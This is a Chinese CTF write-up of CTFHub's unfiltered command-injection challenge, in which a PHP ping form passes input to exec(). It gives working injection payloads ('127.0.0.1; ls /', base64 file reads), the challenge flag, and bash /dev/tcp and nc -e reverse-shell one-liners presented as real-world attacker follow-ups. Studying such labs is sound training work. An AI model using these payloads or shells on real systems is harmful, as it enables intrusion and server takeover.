CTFHub RCE - 命令注入-无过滤

2026年9月22日 CTFHub Web安全 RCE 命令注入

一、题目信息

  • 题目名称：命令注入-无过滤
  • 题目平台：CTFHub 技能树
  • 题目类型：Web安全 / RCE（远程命令执行） / 命令注入
  • 靶场链接：http://challenge-d81dc2d8fdbc3ded.sandbox.ctfhub.com:10800（动态环境）
  • 涉及工具：Chrome浏览器、Base64在线解码工具

二、解题步骤

1. 分析题目考什么

本题的核心考点是最原始的命令注入（Command Injection）。题目名为“无过滤”，意味着后端代码完全没有对用户输入做任何安全处理。开发者将用户输入的 IP 地址直接拼接到了系统命令 ping 中。攻击者只需利用 Linux Shell 的命令分隔符（如分号 ;），就可以在原命令执行完毕后，追加执行任意的系统命令，从而读取服务器上的任意文件（如 Flag）。

2. 怎么想（破题思路）

  • 页面是一个“在线测试网络延迟的平台”，只有一个输入 IP 的框，功能就是执行 Ping 命令。
  • 查看源码，发现核心逻辑是 $cmd = "ping -c 4 {$_GET['ip']}"; exec($cmd, $res);。
  • 这意味着你的输入被当成字符串拼接到了 ping 命令里。如果不做过滤，我们可以输入 127.0.0.1; ls 来测试是否能执行额外命令。
  • 思路确认：利用命令拼接符 ;，先让 ping 正常执行（避免报错引起怀疑），然后紧接着执行我们的探测命令。
  • 探测顺序：看当前目录（ls） -> 看根目录（ls /） -> 读取目标文件。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：URL 特殊字符未编码导致命令截断

踩坑情况：在浏览器地址栏直接输入 ?ip=127.0.0.1; ls /，结果页面报错或只执行了 ping。

原因分析：URL 中不能直接包含空格和特殊字符。分号 ; 在某些情况下会被浏览器或服务器认为是参数分隔符；空格会被截断或转义，导致命令拼接失败。

改进方式：必须对特殊字符进行 URL 编码。空格编码为 %20，分号编码为 %3B。正确的 Payload 应为：?ip=127.0.0.1%3B%20ls%20/。

踩坑记录二：cat 读取 PHP 文件导致空白

踩坑情况：找到文件 3709713823580.php 后，使用 cat 命令读取，页面无回显。

原因分析：PHP 解析器会执行 <?php // ctfhub{...} ?> 里的代码，// 后面的内容被当作注释吞掉。

改进方式：必须使用 base64 命令读取文件原始内容，然后在本地进行解码，避免被 PHP 解析器处理。

踩坑记录三：环境重置导致 Flag 过期

踩坑情况：成功解码出 Flag 后提交，系统提示“flag错误”。

原因分析：CTFHub 靶场环境按时间计费，临近过期时后台可能动态重置 Flag 文件内容。

改进方式：拿到 Flag 必须立刻提交。如果报错，重新执行 ls 和 base64 命令，读取最新的文件内容并再次解码提交。

详细实操步骤（逐字解析）

第一步：探测根目录

在输入框或 URL 中构造 Payload 并执行：

127.0.0.1; ls /

对应的 URL 编码形式为：

?ip=127.0.0.1%3B%20ls%20/

Payload 逐字深度解析：

  • 127.0.0.1：本地回环地址。确保前面的 ping 命令能正常工作，不报错。
  • %3B（即分号 ;）：命令拼接符，表示执行完前一个命令后，紧接着执行下一个命令。
  • %20（即空格）：分隔命令与参数。
  • ls：列出目录内容的命令。
  • /：表示根目录。

第二步：读取 Flag

发现当前目录下有 3709713823580.php，直接使用 base64 读取它：

127.0.0.1; base64 3709713823580.php

URL 编码后的形式：

?ip=127.0.0.1%3B%20base64%203709713823580.php

页面回显 Base64 字符串，在线解码得到最终 Flag：ctfhub{8a3b75ad87f8a7081ab0d233}。

4. 怎么迁移（跨领域联想）

  • 命令注入的防御：开发人员必须使用白名单或转义函数。PHP 中可以使用 escapeshellarg() 和 escapeshellcmd() 对用户输入进行转义，避免注入。更安全的做法是根本不使用系统命令，改用语言内置的网络库。
  • 其他拼接符：除了 ;，还有 |（管道）、&（后台执行）、&&（前一个成功才执行后一个）、||（前一个失败才执行后一个）、%0a（换行符）。
  • 反弹 Shell：在真实渗透中，命令注入不仅用于读文件，攻击者还会使用 bash -i >& /dev/tcp/ip/port 0>&1 或 nc -e /bin/sh ip port 反弹一个交互式 Shell，从而获得服务器控制权。

三、名词大全与原理深度复盘

1. 命令注入（Command Injection）

指应用程序将不安全的用户输入作为系统命令的一部分执行。当开发者没有对用户输入进行过滤时，攻击者可以构造特殊的字符（如 ;、|）来执行额外的系统命令。

2. exec() 函数与 Shell 解析机制

exec() 是 PHP 用于执行外部程序的函数。当传入一个字符串时，PHP 会调用底层的 Shell（如 /bin/sh）来解析并执行。Shell 看到 ; 会把命令分割成两部分，先执行前面的 ping，再执行后面的 ls 或 base64。

3. 为什么 exec 会执行拼接的命令？

因为 exec() 没有“智能识别”能力，它只是把整个字符串丢给系统 Shell。Shell 的职责就是解析命令分隔符并依次执行，所以我们的恶意命令会被当作合法命令运行。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与代码执行（eval）的区别：代码执行是执行 PHP 代码，需要符合 PHP 语法（如 `system('ls');`）；命令注入是直接执行系统命令，不需要 PHP 语法包装，只要用拼接符即可。
  • 与文件包含的区别：文件包含是“借刀杀人”（包含已有文件）；命令注入是“直接控制”（让服务器直接执行命令）。

2. 这种题目的出现原因

开发人员在实现系统管理或网络测试功能时，贪图方便直接使用 exec、system 等函数拼接用户输入，却没有进行任何过滤。这是最原始但也最危险的漏洞类型之一，在 IoT 设备固件、旧版企业系统中非常常见。

3. 这种应用在实际中如何体现？

在真实红蓝对抗中，命令注入是获取服务器权限的“直通车”。攻击者一旦发现此漏洞，会立刻反弹 Shell 并提权，进而控制整个服务器甚至内网。企业防御应尽量禁用此类函数，或使用白名单限制输入。

4. 如何抽象理解概念（大白话理解）

把服务器比作一个老实的传令兵：

  • 正常流程：你给传令兵一张纸条，上面写着“去敲 127.0.0.1 的门”。传令兵老老实实去敲门。
  • 命令注入：你在纸条上写“去敲 127.0.0.1 的门；顺便把保险柜里的 flag 拿出来”。
  • 传令兵的反应：传令兵很老实，他觉得前半句和后半句都是命令。于是他敲完门，紧接着就去把 flag 拿出来了。
  • 防御：聪明的长官会规定：“纸条上只能写 IP 地址，别的字一律不准写”。这样传令兵就不会被利用。
